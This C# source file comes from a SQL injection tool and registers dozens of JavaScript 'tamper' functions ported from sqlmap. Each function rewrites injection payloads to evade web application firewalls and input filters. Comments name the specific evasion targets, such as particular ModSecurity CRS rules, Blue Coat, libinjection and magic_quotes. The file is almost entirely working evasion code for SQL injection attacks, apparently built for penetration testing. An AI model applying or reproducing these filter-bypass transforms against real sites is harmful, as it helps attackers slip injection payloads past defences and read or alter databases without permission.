using System.Collections.Generic;
using SuperSQLInjectionV2.Models;

namespace SuperSQLInjectionV2.Bypass
{
    /// <summary>内置tamper条目（JS实现，QuickJS池化执行；Name/Description供注册表与UI展示）</summary>
    public sealed class BuiltinTamper
    {
        public required string Name { get; init; }
        public required string Description { get; init; }
        /// <summary>JS实现（function tamper(payload)），经ScriptTamperEngine池化执行</summary>
        public required string JsCode { get; init; }
        /// <summary>默认作用域：sqlmap中修改HTTP头/拼接参数的tamper为报文级，其余为Payload级</summary>
        public ScriptScope Scope { get; init; } = ScriptScope.Payload;
    }

    /// <summary>
    /// 内置tamper库：83个与 sqlmap tamper/*.py 逐一对齐的JS移植（行为以sqlmap doctest为准），
    /// 外加本工具自研的 hexprepare/hexpreparechar（堆叠注入语句级重写）。
    /// 内置项在编码处理页以"内置"标识展示（不可编辑/删除，编辑弹窗只读展示JS实现），执行走QuickJS池化上下文。
    /// </summary>
    public static class BuiltinTampers
    {
        public static IReadOnlyDictionary<string, BuiltinTamper> All { get; } = BuildAll();

        public static bool TryGet(string name, out BuiltinTamper tamper)
        {
            return All.TryGetValue(name ?? "", out tamper!);
        }

        //======== JS 公共片段 ========

        /// <summary>UTF-8字节串 helper（unescape(encodeURIComponent(s))，与C# UTF8.GetBytes等价）</summary>
        private const string Utf8Fn = "function utf8bin(s){ return unescape(encodeURIComponent(s)); }\n";

        /// <summary>引号感知空白替换walker骨架（space2comment/space2plus/space2morecomment共用）：
        /// 首个空白直接替换，其后仅引号外的空格替换（与sqlmap firstspace逻辑一致）</summary>
        private static string SpaceWalkerJs(string repl)
        {
            return """
function tamper(payload){
    if (!payload) { return payload; }
    var retVal = '', quote = false, dquote = false, firstspace = false;
    for (var i = 0; i < payload.length; i++){
        var c = payload.charAt(i);
        if (!firstspace){
            if (/\s/.test(c)){ firstspace = true; retVal += 'REPL'; continue; }
        } else if (c === "'" && payload.charAt(i - 1) !== '\\'){
            quote = !quote;
        } else if (c === '"' && payload.charAt(i - 1) !== '\\'){
            dquote = !dquote;
        } else if (c === ' ' && !dquote && !quote){
            retVal += 'REPL'; continue;
        }
        retVal += c;
    }
    return retVal;
}
""".Replace("REPL", repl);
        }

        /// <summary>注释截断walker骨架（space2dash/space2hash/space2mssqlhash/space2mysqldash共用）：
        /// 引号外空白替换为repl()，遇#或-- 注释符原样追加剩余并终止（与sqlmap一致）</summary>
        private static string CommentWalkerJs(string replExpr)
        {
            return """
function tamper(payload){
    if (!payload) { return ''; }
    var retVal = '', quote = false, dquote = false;
    for (var i = 0; i < payload.length; i++){
        var c = payload.charAt(i);
        if (c === "'" && payload.charAt(i - 1) !== '\\'){ quote = !quote; }
        else if (c === '"' && payload.charAt(i - 1) !== '\\'){ dquote = !dquote; }
        if (!quote && !dquote){
            if (/\s/.test(c)){ retVal += REPL; }
            else if (c === '#' || payload.substr(i, 3) === '-- '){ retVal += payload.substring(i); break; }
            else { retVal += c; }
        } else { retVal += c; }
    }
    return retVal;
}
""".Replace("REPL", replExpr);
        }

        /// <summary>随机字母串（6~12位大小写字母，与sqlmap space2dash/hash一致）</summary>
        private const string RandStrFn = """
function randStr(){
    var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    var n = 6 + Math.floor(Math.random() * 7), out = '';
    for (var i = 0; i < n; i++){ out += chars.charAt(Math.floor(Math.random() * chars.length)); }
    return out;
}
""";

        /// <summary>随机空白选择walker骨架（space2randomblank/space2mysqlblank/space2mssqlblank共用）</summary>
        private static string BlankWalkerJs(string blanksArray, bool mssqlEndRule)
        {
            string endRule = mssqlEndRule ? """
            else if (c === '#' || payload.substr(i, 3) === '-- '){ end = true; }
            else if (c === ' ' && !dquote && !quote){
                retVal += blanks[Math.floor(Math.random() * (end ? blanks.length - 1 : blanks.length))]; continue;
            }
"""
            : """
            else if (c === ' ' && !dquote && !quote){ retVal += blanks[Math.floor(Math.random() * blanks.length)]; continue; }
""";
            return "function tamper(payload){\n"
                + "    if (!payload) { return payload; }\n"
                + "    var blanks = [" + blanksArray + "];\n"
                + "    var retVal = '', quote = false, dquote = false, firstspace = false, end = false;\n"
                + "    for (var i = 0; i < payload.length; i++){\n"
                + "        var c = payload.charAt(i);\n"
                + "        if (!firstspace){\n"
                + "            if (/\\s/.test(c)){ firstspace = true; retVal += blanks[Math.floor(Math.random() * blanks.length)]; continue; }\n"
                + "        } else if (c === \"'\" && payload.charAt(i - 1) !== '\\\\'){ quote = !quote; }\n"
                + "        else if (c === '\"' && payload.charAt(i - 1) !== '\\\\'){ dquote = !dquote; }\n"
                + endRule
                + "        retVal += c;\n"
                + "    }\n"
                + "    return retVal;\n"
                + "}";
        }

        private static Dictionary<string, BuiltinTamper> BuildAll()
        {
            var d = new Dictionary<string, BuiltinTamper>(System.StringComparer.OrdinalIgnoreCase);
            void Reg(string name, string desc, string js, ScriptScope scope = ScriptScope.Payload)
                => d[name] = new BuiltinTamper { Name = name, Description = desc, JsCode = js, Scope = scope };

            //---- 替换/正则类 ----
            Reg("0eunion", "数字+e0接UNION（1e0UNION，MySQL/MSSQL科学计数绕过）",
                "function tamper(payload){ return payload ? payload.replace(/(\\d+)\\s+(UNION )/gi, '$1e0$2') : payload; }");
            Reg("apostrophemask", "单引号→UTF-8全角右单引号%EF%BC%87",
                "function tamper(payload){ return payload ? payload.split(\"'\").join('%EF%BC%87') : payload; }");
            Reg("apostrophenullencode", "单引号→%00%27（NUL+单引号）",
                "function tamper(payload){ return payload ? payload.split(\"'\").join('%00%27') : payload; }");
            Reg("appendnullbyte", "payload末尾追加%00空字节（Access）",
                "function tamper(payload){ return payload ? payload + '%00' : payload; }");
            Reg("base64encode", "整段payload Base64编码（UTF-8）",
                Utf8Fn + """
function tamper(payload){
    if (!payload) { return payload; }
    var bin = utf8bin(payload);
    var t = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    var out = '', i = 0;
    for (; i + 2 < bin.length; i += 3){
        var n = (bin.charCodeAt(i) << 16) | (bin.charCodeAt(i + 1) << 8) | bin.charCodeAt(i + 2);
        out += t.charAt(n >> 18) + t.charAt((n >> 12) & 63) + t.charAt((n >> 6) & 63) + t.charAt(n & 63);
    }
    var rem = bin.length - i;
    if (rem === 1){
        var n1 = bin.charCodeAt(i) << 16;
        out += t.charAt(n1 >> 18) + t.charAt((n1 >> 12) & 63) + '==';
    } else if (rem === 2){
        var n2 = (bin.charCodeAt(i) << 16) | (bin.charCodeAt(i + 1) << 8);
        out += t.charAt(n2 >> 18) + t.charAt((n2 >> 12) & 63) + t.charAt((n2 >> 6) & 63) + '=';
    }
    return out;
}
""");
            Reg("between", "a>b→a NOT BETWEEN 0 AND b；a=b→a BETWEEN b AND b（避开复合运算符）",
                """
function tamper(payload){
    if (!payload) { return payload; }
    var retVal = payload;
    var m = /(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^>]+?)\s*(?<![<])>(?!=)\s*([^>]+)\s*$/i.exec(payload);
    if (m){
        retVal = retVal.split(m[0]).join(m[2] + ' ' + m[4] + ' NOT BETWEEN 0 AND ' + m[5]);
    } else {
        retVal = payload.replace(/\s*(?<![<])>(?!=)\s*(\d+|'[^']+'|\w+\(\d+\))/g, ' NOT BETWEEN 0 AND $1');
    }
    if (retVal === payload){
        var m2 = /(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^=]+?)\s*(?<![<>!])=(?!=)\s*([\w()]+)\s*/i.exec(payload);
        if (m2){
            retVal = retVal.split(m2[0]).join(m2[2] + ' ' + m2[4] + ' BETWEEN ' + m2[5] + ' AND ' + m2[5]);
        }
    }
    return retVal;
}
""");
            Reg("binary", "NULL/数字/hex字面量前注入binary关键字（MySQL，强制字节序比较）",
                """
function tamper(payload){
    if (!payload) { return payload; }
    var retVal = payload;
    retVal = retVal.replace(/\bNULL\b/g, 'binary NULL');
    retVal = retVal.replace(/\b(THEN\s+)(\d+|0x[0-9a-f]+)(\s+ELSE\s+)(\d+|0x[0-9a-f]+)/g, '$1binary $2$3binary $4');
    retVal = retVal.replace(/(\d+\s*[>=]\s*)(\d+)/g, 'binary $1binary $2');
    retVal = retVal.replace(/\b((AND|OR)\s*)(\d+)/g, '$1binary $3');
    retVal = retVal.replace(/([>=]\s*)(\d+)/g, '$1binary $2');
    retVal = retVal.replace(/\b(0x[0-9a-f]+)/g, 'binary $1');
    retVal = retVal.replace(/(\s+binary)+/g, '$1');
    return retVal;
}
""");
            Reg("bluecoat", "SQL关键字后空格转%09且=转LIKE（Blue Coat SGOS WAF）",
                SqlKeywords.JsDecl + """
function tamper(payload){
    if (!payload) { return payload; }
    var retVal = payload.replace(/\b([A-Z_]+)(?=[^\w(]|$)/g, function(m, w){
        return KW.has(w.toUpperCase()) ? m.replace(w, w + '%09') : m;
    });
    retVal = retVal.replace(/\s*(?<![<>!=])=(?!=)\s*/g, ' LIKE ');
    retVal = retVal.split('%09 ').join('%09');
    return retVal;
}
""");
            Reg("castprefix", "前导数字包裹cast(N as decimal)（绕CRS 942360锚定规则，MySQL/PG/MSSQL）",
                "function tamper(payload){ return payload ? payload.replace(/^([+-]?\\d+)(?![\\w.])/, 'cast($1 as decimal)') : payload; }");
            Reg("commalesslimit", "LIMIT M,N→LIMIT N OFFSET M（MySQL/MariaDB/SQLite）",
                """
function tamper(payload){
    if (!payload) { return payload; }
    var m = /LIMIT\s*(\d+),\s*(\d+)/i.exec(payload);
    return m ? payload.split(m[0]).join('LIMIT ' + m[2] + ' OFFSET ' + m[1]) : payload;
}
""");
            Reg("commalessmid", "MID(x,a,b)→MID(x FROM a FOR b)（MySQL逗号被过滤时）",
                """
function tamper(payload){
    if (!payload) { return payload; }
    var m = /MID\((.+?)\s*,\s*(\d+)\s*,\s*(\d+)\s*\)/i.exec(payload);
    return m ? payload.split(m[0]).join('MID(' + m[1] + ' FROM ' + m[2] + ' FOR ' + m[3] + ')') : payload;
}
""");
            Reg("commentbeforeparentheses", "括号前插入内联注释（( → /**/(）",
                "function tamper(payload){ return payload ? payload.replace(/\\b(\\w+)\\(/g, '$1/**/(') : payload; }");
            Reg("concat2concatws", "CONCAT(a,b)→CONCAT_WS(MID(CHAR(0),0,0),a,b)（MySQL，跳过GROUP_CONCAT）",
                "function tamper(payload){ return payload ? payload.replace(/(?<!GROUP_)CONCAT\\(/gi, 'CONCAT_WS(MID(CHAR(0),0,0),') : payload; }");
            Reg("decentities", "全部字符→HTML十进制实体&#NN;",
                """
function tamper(payload){
    if (!payload) { return payload; }
    var out = '';
    for (var i = 0; i < payload.length; i++){ out += '&#' + payload.charCodeAt(i) + ';'; }
    return out;
}
""");
            Reg("dollarquote", "单引号字符串→PG美元引用$$..$$（含$$的字面量不动，PostgreSQL）",
                """
function tamper(payload){
    if (!payload) { return payload; }
    return payload.replace(/'([^']*)'/g, function(m, v){ return v.indexOf('$$') < 0 ? '$' + '$' + v + '$' + '$' : m; });
}
""");
            Reg("dunion", "数字+UNION→数字DUNION（Oracle）",
                "function tamper(payload){ return payload ? payload.replace(/(\\d+)\\s+(UNION )/gi, '$1D$2') : payload; }");
            Reg("equaltolike", "等号→LIKE（避开<=/>=/!=/==；不适用PostgreSQL）",
                "function tamper(payload){ return payload ? payload.replace(/\\s*(?<![<>!=])=(?!=)\\s*/g, ' LIKE ') : payload; }");
            Reg("equaltorlike", "等号→RLIKE（避开复合运算符，MySQL）",
                "function tamper(payload){ return payload ? payload.replace(/\\s*(?<![<>!=])=(?!=)\\s*/g, ' RLIKE ') : payload; }");
            Reg("escapequotes", "单双引号加反斜杠转义（'→\\' \"→\\\"）",
                "function tamper(payload){ return payload ? payload.split(\"'\").join(\"\\\\'\").split('\"').join('\\\\\"') : payload; }");
            Reg("greatest", "a>b→GREATEST(a,b+1)=a（MySQL/PG/MSSQL2022+/Oracle，不适用SQLite）",
                """
function tamper(payload){
    if (!payload) { return payload; }
    var m = /(\b(AND|OR)\b\s+)([^>]+?)\s*>\s*(\w+|'[^']+')/i.exec(payload);
    return m ? payload.split(m[0]).join(m[1] + 'GREATEST(' + m[3] + ',' + m[4] + '+1)=' + m[3]) : payload;
}
""");
            Reg("hex2char", "0x hex串→CONCAT(CHAR(n),..)（MySQL，应用层大写化场景）",
                """
function tamper(payload){
    if (!payload) { return payload; }
    var retVal = payload, re = /\b0x([0-9a-f]+)\b/gi, m;
    while ((m = re.exec(payload)) !== null){
        var hexs = m[1], parts = [];
        for (var i = 0; i + 1 < hexs.length; i += 2){ parts.push('CHAR(' + parseInt(hexs.substr(i, 2), 16) + ')'); }
        retVal = retVal.split(m[0]).join(parts.length > 1 ? 'CONCAT(' + parts.join(',') + ')' : parts[0]);
    }
    return retVal;
}
""");
            Reg("hexentities", "全部字符→HTML十六进制实体&#xNN;",
                """
function tamper(payload){
    if (!payload) { return payload; }
    var out = '';
    for (var i = 0; i < payload.length; i++){ out += '&#x' + payload.charCodeAt(i).toString(16) + ';'; }
    return out;
}
""");
            Reg("htmlencode", "非字母数字→HTML十进制实体（已有&#NN;先解码再编，幂等）",
                """
function tamper(payload){
    if (!payload) { return payload; }
    payload = payload.replace(/&#(\d+);/g, function(m, n){ return String.fromCharCode(parseInt(n, 10)); });
    return payload.replace(/[^\w]/g, function(c){ return '&#' + c.charCodeAt(0) + ';'; });
}
""");
            Reg("informationschemacomment", "information_schema后插内联注释（information_schema/**/.TABLES）",
                "function tamper(payload){ return payload ? payload.replace(/(information_schema)\\./gi, '$1/**/.') : payload; }");
            Reg("infoschema2innodb", "information_schema.tables→mysql.innodb_table_stats（绕CRS 942140，MySQL）",
                """
function tamper(payload){
    if (!payload || !/information_schema\.tables/i.test(payload)) { return payload; }
    return payload.replace(/information_schema\.tables/gi, 'mysql.innodb_table_stats').replace(/table_schema/gi, 'database_name');
}
""");
            Reg("least", "a>b→LEAST(a,b+1)=b+1（MySQL/PG/MSSQL2022+/Oracle，不适用SQLite）",
                """
function tamper(payload){
    if (!payload) { return payload; }
    var m = /(\b(AND|OR)\b\s+)([^>]+?)\s*>\s*(\w+|'[^']+')/i.exec(payload);
    return m ? payload.split(m[0]).join(m[1] + 'LEAST(' + m[3] + ',' + m[4] + '+1)=' + m[4] + '+1') : payload;
}
""");
            Reg("misunion", "UNION前空格→-.1（1-.1UNION，MySQL）",
                "function tamper(payload){ return payload ? payload.replace(/\\s+(UNION )/gi, '-.1$1') : payload; }");
            Reg("mssqlnosemicolon", "语句分隔分号→空格（T-SQL无需分隔符，MSSQL堆叠绕过；）",
                "function tamper(payload){ return payload ? payload.replace(/;(?=\\s*(?:WAITFOR|DECLARE|SET|EXEC(?:UTE)?|SELECT|INSERT|UPDATE|DELETE|CREATE|DROP|ALTER|TRUNCATE|BEGIN|IF|WHILE|PRINT|USE|GRANT|REVOKE|BACKUP|RESTORE|RECONFIGURE|SHUTDOWN|WITH)\\b)/gi, ' ') : payload; }");
            Reg("ord2ascii", "ORD(→ASCII(（MySQL）",
                "function tamper(payload){ return payload ? payload.replace(/\\bORD\\(/gi, 'ASCII(') : payload; }");
            Reg("scientific", "MySQL科学计数法混淆（) , . * ^ / | & 后插 1.e，函数名后接 1.e(）",
                """
function tamper(payload){
    if (!payload) { return payload; }
    payload = payload.replace(/[),.*^\/|&]/g, ' 1.e$&');
    payload = payload.replace(/(\w+)\(/g, function(m, w){
        return /^(MID|CAST|FROM|COUNT)$/i.test(w) ? m : w + ' 1.e(';
    });
    return payload;
}
""");
            Reg("sign", "a>b→SIGN((a)-(b))=1（各库通用，盲注序数比较等价改写）",
                """
function tamper(payload){
    if (!payload) { return payload; }
    var m = /(\b(AND|OR)\b\s+)([^><]+?)\s*(?<![<>!])>(?!=)\s*(\w+|'[^']+')/i.exec(payload);
    return m ? payload.split(m[0]).join(m[1] + 'SIGN((' + m[3] + ')-(' + m[4] + '))=1') : payload;
}
""");
            Reg("sleep2getlock", "SLEEP(→GET_LOCK('rand',（MySQL，绕SLEEP/BENCHMARK过滤）",
                """
function tamper(payload){
    if (!payload) { return payload; }
    var chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', alias = '';
    for (var i = 0; i < 4; i++){ alias += chars.charAt(Math.floor(Math.random() * chars.length)); }
    return payload.split('SLEEP(').join("GET_LOCK('" + alias + "',");
}
""");
            Reg("sleep2hex", "SLEEP(5)→SLEEP(0x5)（绕CRS 942160纯数字匹配，MySQL/MariaDB）",
                """
function tamper(payload){
    return payload ? payload.replace(/\bSLEEP\(\s*(\d+)\s*\)/gi, function(m, n){ return 'SLEEP(0x' + parseInt(n, 10).toString(16) + ')'; }) : payload;
}
""");
            Reg("sp_password", "payload末尾追加sp_password（MSSQL日志脱敏）",
                """
function tamper(payload){
    if (!payload) { return ''; }
    return payload + (payload.indexOf('#') < 0 && payload.indexOf('-- ') < 0 ? '-- ' : '') + 'sp_password';
}
""");
            Reg("symboliclogical", "AND→%26%26，OR→%7C%7C（&&/||的URL编码形态）",
                "function tamper(payload){ return payload ? payload.replace(/\\bOR\\b/gi, '%7C%7C').replace(/\\bAND\\b/gi, '%26%26') : payload; }");
            Reg("unionalltounion", "UNION ALL SELECT→UNION SELECT",
                "function tamper(payload){ return payload ? payload.replace(/UNION\\s+ALL\\s+SELECT/gi, 'UNION SELECT') : payload; }");
            Reg("unmagicquotes", "首个单引号→%bf%27宽字节并补通用注释（绕magic_quotes/addslashes）",
                """
function tamper(payload){
    if (!payload) { return payload; }
    var found = false, retVal = '';
    for (var i = 0; i < payload.length; i++){
        var c = payload.charAt(i);
        if (c === "'" && !found){ retVal += '%bf%27'; found = true; }
        else { retVal += c; }
    }
    if (found){
        var stripped = retVal.replace(/\s*(AND|OR)[\s(]+([^\s]+)\s*(=|LIKE)\s*\2/i, '');
        if (stripped !== retVal){ retVal = stripped + '-- -'; }
        else if (retVal.indexOf('#') < 0 && retVal.indexOf('--') < 0 && retVal.indexOf('/*') < 0){ retVal += '-- -'; }
    }
    return retVal;
}
""");
            Reg("quote2ltat", "前导单引号+OR→'<@ OR（libinjection不建模<@序列，MySQL/Percona）",
                "function tamper(payload){ return payload ? payload.replace(/^'\\s*(?=(?:OR|\\|\\|)\\b)/i, \"'<@ \") : payload; }");
            Reg("schemasplit", "FROM schema.table→FROM schema 9.e.table（MySQL语法混淆）",
                "function tamper(payload){ return payload ? payload.replace(/( FROM \\w+)\\.(\\w+)/gi, '$1 9.e.$2') : payload; }");

            //---- 编码类 ----
            Reg("charencode", "逐字符URL编码（已有%XX序列跳过，字母数字也编码）",
                """
function tamper(payload){
    if (!payload) { return payload; }
    var out = '', i = 0;
    while (i < payload.length){
        if (payload.charAt(i) === '%' && i < payload.length - 2
            && /[0-9a-fA-F]/.test(payload.charAt(i + 1)) && /[0-9a-fA-F]/.test(payload.charAt(i + 2))){
            out += payload.substr(i, 3); i += 3;
        } else {
            out += '%' + payload.charCodeAt(i).toString(16).toUpperCase().padStart(2, '0'); i += 1;
        }
    }
    return out;
}
""");
            Reg("chardoubleencode", "双重URL编码（%XX→%25XX，其余→%25XX）",
                """
function tamper(payload){
    if (!payload) { return payload; }
    var out = '', i = 0;
    while (i < payload.length){
        if (payload.charAt(i) === '%' && i < payload.length - 2
            && /[0-9a-fA-F]/.test(payload.charAt(i + 1)) && /[0-9a-fA-F]/.test(payload.charAt(i + 2))){
            out += '%25' + payload.substr(i + 1, 2); i += 3;
        } else {
            out += '%25' + payload.charCodeAt(i).toString(16).toUpperCase().padStart(2, '0'); i += 1;
        }
    }
    return out;
}
""");
            Reg("charunicodeencode", "全字符→%uXXXX宽字节编码（%XX→%u00XX跳过，非BMP按UTF-16代理对，ASP/ASP.NET）",
                """
function tamper(payload){
    if (!payload) { return payload; }
    var out = '', i = 0;
    while (i < payload.length){
        if (payload.charAt(i) === '%' && i < payload.length - 2
            && /[0-9a-fA-F]/.test(payload.charAt(i + 1)) && /[0-9a-fA-F]/.test(payload.charAt(i + 2))){
            out += '%u00' + payload.substr(i + 1, 2); i += 3;
        } else {
            out += '%u' + payload.charCodeAt(i).toString(16).toUpperCase().padStart(4, '0'); i += 1;
        }
    }
    return out;
}
""");
            Reg("charunicodeescape", "非编码字符→\\uXXXX转义（%XX→\\u00XX，JSON场景）",
                """
function tamper(payload){
    if (!payload) { return payload; }
    var out = '', i = 0;
    while (i < payload.length){
        if (payload.charAt(i) === '%' && i < payload.length - 2
            && /[0-9a-fA-F]/.test(payload.charAt(i + 1)) && /[0-9a-fA-F]/.test(payload.charAt(i + 2))){
            out += '\\u00' + payload.substr(i + 1, 2); i += 3;
        } else {
            out += '\\u' + payload.charCodeAt(i).toString(16).toUpperCase().padStart(4, '0'); i += 1;
        }
    }
    return out;
}
""");
            Reg("overlongutf8", "非字母数字→超长UTF-8编码（' → %C0%A7，%XX跳过）",
                """
function tamper(payload){
    if (!payload) { return payload; }
    var out = '', i = 0;
    function hex2(n){ return n.toString(16).toUpperCase().padStart(2, '0'); }
    while (i < payload.length){
        var c = payload.charAt(i);
        if (c === '%' && i < payload.length - 2
            && /[0-9a-fA-F]/.test(payload.charAt(i + 1)) && /[0-9a-fA-F]/.test(payload.charAt(i + 2))){
            out += payload.substr(i, 3); i += 3; continue;
        }
        if (/[a-zA-Z0-9]/.test(c)){ out += c; i += 1; continue; }
        var ord = payload.charCodeAt(i);
        if (ord <= 0x7FF){
            out += '%' + hex2(0xc0 + (ord >> 6)) + '%' + hex2(0x80 + (ord & 0x3f));
        } else {
            var bin = unescape(encodeURIComponent(c));
            for (var j = 0; j < bin.length; j++){ out += '%' + hex2(bin.charCodeAt(j)); }
        }
        i += 1;
    }
    return out;
}
""");
            Reg("overlongutf8more", "全部字符→超长UTF-8编码（%XX跳过）",
                """
function tamper(payload){
    if (!payload) { return payload; }
    var out = '', i = 0;
    function hex2(n){ return n.toString(16).toUpperCase().padStart(2, '0'); }
    while (i < payload.length){
        var c = payload.charAt(i);
        if (c === '%' && i < payload.length - 2
            && /[0-9a-fA-F]/.test(payload.charAt(i + 1)) && /[0-9a-fA-F]/.test(payload.charAt(i + 2))){
            out += payload.substr(i, 3); i += 3; continue;
        }
        var ord = payload.charCodeAt(i);
        if (ord <= 0x7FF){
            out += '%' + hex2(0xc0 + (ord >> 6)) + '%' + hex2(0x80 + (ord & 0x3f));
        } else {
            var bin = unescape(encodeURIComponent(c));
            for (var j = 0; j < bin.length; j++){ out += '%' + hex2(bin.charCodeAt(j)); }
        }
        i += 1;
    }
    return out;
}
""");
            Reg("percentage", "每个字符前加%（%XX序列与空格跳过，ASP/IIS宽松解析场景）",
                """
function tamper(payload){
    if (!payload) { return payload; }
    var out = '', i = 0;
    while (i < payload.length){
        var c = payload.charAt(i);
        if (c === '%' && i < payload.length - 2
            && /[0-9a-fA-F]/.test(payload.charAt(i + 1)) && /[0-9a-fA-F]/.test(payload.charAt(i + 2))){
            out += payload.substr(i, 3); i += 3;
        } else if (c !== ' '){
            out += '%' + c; i += 1;
        } else { out += c; i += 1; }
    }
    return out;
}
""");

            //---- 结构重写类（平衡括号walker） ----
            Reg("blindbinary", "盲注单字符读→LEFT/RIGHT+BINARY字节序比较（绕CRS 942151/942190函数名打分，MySQL/MSSQL）",
                """
function balEnd(s, start){
    var depth = 0;
    for (var i = start; i < s.length; i++){
        var c = s.charAt(i);
        if (c === '('){ depth++; }
        else if (c === ')'){ depth--; if (depth === 0){ return i; } }
    }
    return -1;
}
function unwrapIsnull(q){
    var ret = q;
    for (;;){
        var m = /IFNULL\(/i.exec(ret);
        if (!m){ break; }
        var end = balEnd(ret, m.index + m[0].length - 1);
        if (end < 0){ break; }
        var inner = ret.substring(m.index + m[0].length, end);
        var sep = -1, depth = 0;
        for (var i = 0; i < inner.length; i++){
            var c = inner.charAt(i);
            if (c === '('){ depth++; }
            else if (c === ')'){ depth--; }
            else if (c === ',' && depth === 0){ sep = i; }
        }
        if (sep < 1){ break; }
        var field = inner.substring(0, sep), dflt = inner.substring(sep + 1);
        ret = ret.substring(0, m.index) + '(IF(' + field + ' IS NULL,' + dflt + ',' + field + '))' + ret.substring(end + 1);
    }
    return ret;
}
function reshape(payload, openerRe, tailRe, build){
    var ret = payload, pos = 0;
    for (;;){
        var m = openerRe.exec(ret.substring(pos));
        if (!m){ break; }
        var start = pos + m.index;
        var cursor = start + m[0].length;
        if (cursor >= ret.length || ret.charAt(cursor) !== '('){ pos = cursor; continue; }
        var end = balEnd(ret, cursor);
        if (end < 0){ pos = cursor; continue; }
        var query = ret.substring(cursor, end + 1);
        var tail = tailRe.exec(ret.substring(end + 1));
        if (!tail || tail.index !== 0){ pos = cursor; continue; }
        var replacement = build(query, tail);
        if (replacement === null){ pos = cursor; continue; }
        ret = ret.substring(0, start) + replacement + ret.substring(end + 1 + tail[0].length);
        pos = start + replacement.length;
    }
    return ret;
}
function hex2(n){ return (n < 16 ? '0' : '') + n.toString(16); }
function mysqlBuild(query, rest){
    var position = rest[1], operator = rest[2], value = parseInt(rest[3], 10);
    query = unwrapIsnull(query);
    return 'RIGHT(LEFT(' + query + ',' + position + '),(' + position + '<=LENGTH(CONVERT(' + query + ' USING ascii))))' + operator + 'BINARY 0x' + hex2(value);
}
function mysqlSetBuild(query, rest){
    var position = rest[1];
    var ords = rest[2].split(',').map(function(x){ return x.trim(); }).filter(function(x){ return /^\d+$/.test(x); })
        .map(function(x){ return parseInt(x, 10); });
    if (!ords.length){ return null; }
    for (var k = 0; k < ords.length; k++){ if (ords[k] > 255){ return null; } }
    query = unwrapIsnull(query);
    var members = ords.map(function(x){ return x === 0 ? "''" : '0x' + hex2(x); }).join(',');
    return 'BINARY RIGHT(LEFT(' + query + ',' + position + '),(' + position + '<=LENGTH(CONVERT(' + query + ' USING ascii)))) IN (' + members + ')';
}
function mssqlBuild(query, rest){
    var position = rest[1], operator = rest[2], value = parseInt(rest[3], 10);
    query = query.replace(/ISNULL\(CAST\((.+?) AS NVARCHAR\(\d+\)\),\s*CHAR\(\d+\)\)/i, '($1)');
    return 'CAST(RIGHT(LEFT(' + query + ',' + position + '),CASE WHEN ' + position + '<=LEN(' + query + ') THEN 1 ELSE 0 END) AS VARBINARY)' + operator + '0x' + hex2(value);
}
function tamper(payload){
    if (!payload) { return payload; }
    var commaTail = /^\s*,\s*(\d+)\s*,\s*1\)\)\s*(>=|<=|>|<|=)\s*(\d+)/;
    var setTail = /^\s*,\s*(\d+)\s*,\s*1\)\)\s+IN\s*\(([\d,\s]+)\)/;
    var ret = reshape(payload, /ORD\(MID\(/i, setTail, mysqlSetBuild);
    ret = reshape(ret, /ORD\(MID\(/i, commaTail, mysqlBuild);
    ret = reshape(ret, /(?:UNICODE|ASCII)\(SUBSTRING\(/i, commaTail, mssqlBuild);
    return ret;
}
""");
            Reg("if2case", "IF(A,B,C)→CASE WHEN (A) THEN (B) ELSE (C) END（MySQL/MariaDB，平衡括号walker）",
                """
function unwrap(expr){
    expr = expr.trim();
    while (expr.length > 1 && expr.charAt(0) === '(' && expr.charAt(expr.length - 1) === ')'){
        var depth = 0, wrapper = true;
        for (var i = 0; i < expr.length; i++){
            var c = expr.charAt(i);
            if (c === '('){ depth++; }
            else if (c === ')'){
                depth--;
                if (depth === 0 && i !== expr.length - 1){ wrapper = false; break; }
            }
        }
        if (!wrapper){ break; }
        expr = expr.substring(1, expr.length - 1).trim();
    }
    return expr;
}
function tamper(payload){
    if (!payload || payload.indexOf('IF(') < 0) { return payload; }
    var MARK = 'PAR';
    payload = payload.split('()').join(MARK);
    while (payload.indexOf('IF(') > -1){
        var index = payload.indexOf('IF(');
        var depth = 1, commas = [], end = -1, quote = false, dquote = false;
        for (var i = index + 3; i < payload.length; i++){
            var c = payload.charAt(i);
            if (c === "'" && payload.charAt(i - 1) !== '\\'){ quote = !quote; }
            else if (c === '"' && payload.charAt(i - 1) !== '\\'){ dquote = !dquote; }
            if (!quote && !dquote){
                if (depth === 1 && c === ','){ commas.push(i); }
                else if (depth === 1 && c === ')'){ end = i; break; }
                else if (c === '('){ depth++; }
                else if (c === ')'){ depth--; }
            }
        }
        if (commas.length === 2 && end > 0){
            var a = unwrap(payload.substring(index + 3, commas[0]));
            var b = unwrap(payload.substring(commas[0] + 1, commas[1]));
            var cc = unwrap(payload.substring(commas[1] + 1, end));
            payload = payload.substring(0, index) + 'CASE WHEN (' + a + ') THEN (' + b + ') ELSE (' + cc + ') END' + payload.substring(end + 1);
        } else { break; }
    }
    return payload.split(MARK).join('()');
}
""");
            Reg("ifnull2casewhenisnull", "IFNULL(A,B)→CASE WHEN ISNULL(A) THEN (B) ELSE (A) END（MySQL/MariaDB，walker）",
                IfNullWalkerJs("newVal = 'CASE WHEN ISNULL(' + a + ') THEN (' + b + ') ELSE (' + a + ') END';"));
            Reg("ifnull2ifisnull", "IFNULL(A,B)→IF(ISNULL(A),B,A)（MySQL/MariaDB，walker）",
                IfNullWalkerJs("newVal = 'IF(ISNULL(' + a + '),' + b + ',' + a + ')';"));
            Reg("mid2leftright", "MID/SUBSTRING/SUBSTR(x,a,b)→RIGHT(LEFT(x,a+b-1),b)（绕CRS 942151，MySQL/MariaDB）",
                """
function tamper(payload){
    if (!payload) { return payload; }
    return payload.replace(/\b(?:MID|SUBSTRING|SUBSTR)\(\s*((?:[^()]|\([^()]*\))+?)\s*,(\s*)([^,()]+),(\s*)([^,()]+)\)/gi,
        function(m, expr, sp1, pos, sp2, len){
            pos = pos.trim(); len = len.trim();
            var end = /^\d+$/.test(pos) && /^\d+$/.test(len) ? String(parseInt(pos, 10) + parseInt(len, 10) - 1) : pos + '+' + len + '-1';
            return 'RIGHT(LEFT(' + expr + ',' + sp1 + end + '),' + sp2 + len + ')';
        });
}
""");
